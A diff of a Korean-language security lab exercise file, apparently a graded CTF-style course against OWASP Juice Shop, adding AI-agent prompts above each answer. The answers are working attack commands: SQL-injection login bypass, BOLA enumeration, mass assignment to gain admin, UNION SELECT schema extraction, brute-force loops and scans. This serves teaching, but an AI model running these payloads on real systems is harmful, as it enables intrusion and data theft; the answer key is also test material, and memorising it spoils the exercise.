@@ -20,8 +20,11 @@ steps:
     /rest/products/search, /rest/user/login 등을 순차적으로 요청하세요.
   category: recon
   points: 8
-  answer: 'echo ''=== JuiceShop API Endpoint Map ==='' && for EP in api/Products api/Users
-    api/Feedbacks api/Challenges api/Recycles api/SecurityQuestions rest/products/search
+  answer: '🤖 프롬프트: JuiceShop(:3000)의 API 엔드포인트를 체계적으로 매핑하시오. /api/, /rest/ 경로 하위의
+    모든 리소스를 탐색해줘
+
+    📎 참고 (CLI): echo ''=== JuiceShop API Endpoint Map ==='' && for EP in api/Products
+    api/Users api/Feedbacks api/Challenges api/Recycles api/SecurityQuestions rest/products/search
     rest/user/login rest/track-order; do echo -n "/$EP: " && curl -s -o /dev/null
     -w ''%{http_code}'' http://10.20.30.80:3000/$EP 2>/dev/null && echo ''''; done
     && echo ''=== API Mapping Complete ==='''
@@ -47,7 +50,10 @@ steps:
     등 민감 정보가 포함되는지 확인합니다.
   category: exploit
   points: 12
-  answer: 'curl -s http://10.20.30.80:3000/api/Users/ | python3 -c "import sys,json;
+  answer: '🤖 프롬프트: 인증 없이 접근 가능한 API에서 사용자 목록을 조회하시오. /api/Users/ 응답에서 과도한 데이터 노출(Excessive
+    Data Exposure)을 확인해줘
+
+    📎 참고 (CLI): curl -s http://10.20.30.80:3000/api/Users/ | python3 -c "import sys,json;
     data=json.load(sys.stdin).get(''data'',[]); [print(f''User {u.get(\"id\")}: email={u.get(\"email\")},
     role={u.get(\"role\",\"N/A\")}'') for u in data[:5]]" 2>/dev/null || curl -s http://10.20.30.80:3000/api/Users/
     | head -c 500'
@@ -72,11 +78,13 @@ steps:
   hint: SQL Injection으로 로그인한 후, Authorization 헤더로 다른 ID의 basket에 접근하세요.
   category: exploit
   points: 12
-  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
-    application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"''
-    | cut -d''"'' -f4) && for i in 1 2 3; do echo "=== Basket $i ===" && curl -s http://10.20.30.80:3000/rest/basket/$i
-    -H "Authorization: Bearer $TOKEN" -o /dev/null -w ''HTTP:%{http_code}'' && echo
-    ''''; done'
+  answer: '🤖 프롬프트: Broken Object Level Authorization(BOLA) 취약점을 테스트해줘
+
+    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
+    ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}''
+    | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && for i in 1 2 3; do echo "===
+    Basket $i ===" && curl -s http://10.20.30.80:3000/rest/basket/$i -H "Authorization:
+    Bearer $TOKEN" -o /dev/null -w ''HTTP:%{http_code}'' && echo ''''; done'
   answer_detail: 'OWASP API #1 BOLA: API가 객체 수준의 권한 확인을 하지 않아, 다른 사용자의 리소스에 접근할 수
     있습니다. basket/1, basket/2처럼 순차적 ID를 열거하면 모든 사용자의 장바구니를 조회할 수 있습니다.'
   verify:
@@ -98,14 +106,15 @@ steps:
     형태로 요청하세요.
   category: exploit
   points: 12
-  answer: "curl -s -X POST http://10.20.30.80:3000/api/Users/ \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{\"email\":\"massassign_test@test.com\",\"password\"\
-    :\"hack1234\",\"passwordRepeat\":\"hack1234\",\"role\":\"admin\",\"isAdmin\":true}'\
-    \ \\\n | python3 -c \"import sys,json; d=json.load(sys.stdin).get('data',{});\
-    \ print(f'id={d.get(\\\"id\\\")}, email={d.get(\\\"email\\\")}, role={d.get(\\\
-    \"role\\\",\\\"?\\\")}, isAdmin={d.get(\\\"isAdmin\\\",\\\"?\\\")}')\" 2>/dev/null\
-    \ || curl -s -X POST http://10.20.30.80:3000/api/Users/ -H 'Content-Type: application/json'\
-    \ -d '{\"email\":\"massassign_test@test.com\",\"password\":\"hack1234\",\"passwordRepeat\"\
+  answer: "\U0001F916 프롬프트: Mass Assignment 공격을 수행해줘\n\U0001F4CE 참고 (CLI): curl -s\
+    \ -X POST http://10.20.30.80:3000/api/Users/ \\\n  -H 'Content-Type: application/json'\
+    \ \\\n  -d '{\"email\":\"massassign_test@test.com\",\"password\":\"hack1234\"\
+    ,\"passwordRepeat\":\"hack1234\",\"role\":\"admin\",\"isAdmin\":true}' \\\n |\
+    \ python3 -c \"import sys,json; d=json.load(sys.stdin).get('data',{}); print(f'id={d.get(\\\
+    \"id\\\")}, email={d.get(\\\"email\\\")}, role={d.get(\\\"role\\\",\\\"?\\\")},\
+    \ isAdmin={d.get(\\\"isAdmin\\\",\\\"?\\\")}')\" 2>/dev/null || curl -s -X POST\
+    \ http://10.20.30.80:3000/api/Users/ -H 'Content-Type: application/json' -d '{\"\
+    email\":\"massassign_test@test.com\",\"password\":\"hack1234\",\"passwordRepeat\"\
     :\"hack1234\",\"role\":\"admin\"}'"
   answer_detail: 'OWASP API #6 Mass Assignment: 서버가 클라이언트 요청의 모든 필드를 그대로 모델에 바인딩하면,
     공격자가 role, isAdmin 같은 숨겨진 필드를 추가하여 권한 상승을 할 수 있습니다. 응답에 role:admin이 반영되면 취약합니다.'
@@ -131,9 +140,11 @@ steps:
   hint: for 루프로 curl -X POST /rest/user/login 에 잘못된 비밀번호를 반복 전송하세요.
   category: exploit
   points: 10
-  answer: 'echo ''=== Rate Limiting Test (20 attempts) ==='' && for i in $(seq 1 20);
-    do echo -n "Attempt $i: " && curl -s -o /dev/null -w ''%{http_code}'' -X POST
-    http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+  answer: '🤖 프롬프트: Rate Limiting 부재를 확인해줘
+
+    📎 참고 (CLI): echo ''=== Rate Limiting Test (20 attempts) ==='' && for i in $(seq
+    1 20); do echo -n "Attempt $i: " && curl -s -o /dev/null -w ''%{http_code}'' -X
+    POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
     -d ''{"email":"admin@juice-sh.op","password":"wrong_''"$i"''"}'' && echo '''';
     done | tail -5 && echo ''=== Rate Limit Test Complete ==='''
   answer_detail: 'OWASP API #4 Lack of Resources & Rate Limiting: Rate Limiting이 없으면
@@ -156,11 +167,13 @@ steps:
   hint: curl -X GET/PUT/DELETE /api/Products/1 으로 각 메서드를 테스트하세요.
   category: exploit
   points: 12
-  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
-    application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"''
-    | cut -d''"'' -f4) && echo ''=== Function Level Auth Test ==='' && for METHOD
-    in GET PUT DELETE OPTIONS; do echo -n "$METHOD /api/Products/1: " && curl -s -o
-    /dev/null -w ''%{http_code}'' -X $METHOD http://10.20.30.80:3000/api/Products/1
+  answer: '🤖 프롬프트: Broken Function Level Authorization을 테스트해줘
+
+    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
+    ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}''
+    | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && echo ''=== Function Level
+    Auth Test ==='' && for METHOD in GET PUT DELETE OPTIONS; do echo -n "$METHOD /api/Products/1:
+    " && curl -s -o /dev/null -w ''%{http_code}'' -X $METHOD http://10.20.30.80:3000/api/Products/1
     -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" && echo
     ''''; done && echo ''=== Auth Test Complete ==='''
   answer_detail: 'OWASP API #5 Broken Function Level Authorization: 서버가 HTTP 메서드별로
@@ -187,8 +200,11 @@ steps:
     넣으세요.
   category: exploit
   points: 12
-  answer: curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master+WHERE+type=%27table%27--'
-    | head -c 500
+  answer: '🤖 프롬프트: SQL Injection을 통한 API 데이터 탈취를 수행하시오. /rest/products/search 엔드포인트에서
+    UNION SELECT로 데이터베이스 스키마를 추출해줘
+
+    📎 참고 (CLI): curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master+WHERE+type=%27table%27--''
+    | head -c 500'
   answer_detail: JuiceShop의 검색 API는 SQLite를 사용하며, 입력 검증이 없어 UNION SELECT로 다른 테이블의
     데이터를 추출할 수 있습니다. sqlite_master 테이블에서 전체 스키마를 조회하면 Users, Cards 등의 민감 테이블 구조가 노출됩니다.
   verify:
@@ -207,7 +223,10 @@ steps:
   hint: curl -I로 API 응답 헤더를 확인하세요. Access-Control-Allow-Origin이 *이면 모든 도메인에서 접근 가능합니다.
   category: defense
   points: 8
-  answer: 'echo ''=== API Security Headers ==='' && curl -sI http://10.20.30.80:3000/api/Products/
+  answer: '🤖 프롬프트: API 응답 보안 헤더를 분석하시오. CORS 설정, X-Content-Type-Options, Cache-Control
+    등이 올바르게 설정되어 있는지 확인해줘
+
+    📎 참고 (CLI): echo ''=== API Security Headers ==='' && curl -sI http://10.20.30.80:3000/api/Products/
     | grep -iE ''(access-control|x-content|cache-control|x-frame|strict-transport|content-security)''
     && echo ''=== CORS Preflight ==='' && curl -sI -X OPTIONS http://10.20.30.80:3000/api/Products/
     -H ''Origin: http://evil.com'' -H ''Access-Control-Request-Method: DELETE'' |
@@ -233,7 +252,10 @@ steps:
   hint: curl로 각 경로에 접근하여 200 응답이 오는지 확인하세요.
   category: recon
   points: 8
-  answer: 'echo ''=== API Documentation Scan ==='' && for PATH in /api-docs /swagger.json
+  answer: '🤖 프롬프트: Swagger/OpenAPI 문서 노출 여부를 확인하시오. /api-docs, /swagger.json, /graphql
+    등의 문서 엔드포인트를 탐색해줘
+
+    📎 참고 (CLI): echo ''=== API Documentation Scan ==='' && for PATH in /api-docs /swagger.json
     /graphql /.well-known/openapi.json /api-docs/swagger.json /v2/api-docs; do CODE=$(curl
     -s -o /dev/null -w ''%{http_code}'' http://10.20.30.80:3000$PATH 2>/dev/null);
     echo "$PATH: $CODE"; done && echo ''=== Doc Scan Complete ==='''
@@ -256,7 +278,9 @@ steps:
   hint: BOLA, Excessive Data Exposure, Mass Assignment, Rate Limiting 부재 등을 종합 정리하세요.
   category: reporting
   points: 10
-  answer: 'cat > /tmp/api_report.txt << ''EOF''
+  answer: '🤖 프롬프트: API 보안 종합 평가를 수행해줘
+
+    📎 참고 (CLI): cat > /tmp/api_report.txt << ''EOF''
 
     === API 보안 종합 평가 보고서 ===
 
@@ -378,7 +402,18 @@ steps:
     field: stdout
   target_vm: attacker
   risk_level: low
-  answer: ''
+  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
+
+    1) JuiceShop(:3000)의 API 엔드포인트를 체계적으로 매핑하시오. /api/, /rest/ 경로 하위의 모든 리소스를 탐색해줘
+
+    2) 인증 없이 접근 가능한 API에서 사용자 목록을 조회하시오. /api/Users/ 응답에서 과도한 데이터 노출(Excessive Data
+    Exposure)을 확인해줘
+
+    3) Broken Object Level Authorization(BOLA) 취약점을 테스트해줘
+
+    4) Mass Assignment 공격을 수행해줘
+
+    5) Rate Limiting 부재를 확인해줘'
   answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
     다단계 작업.
   script: ''
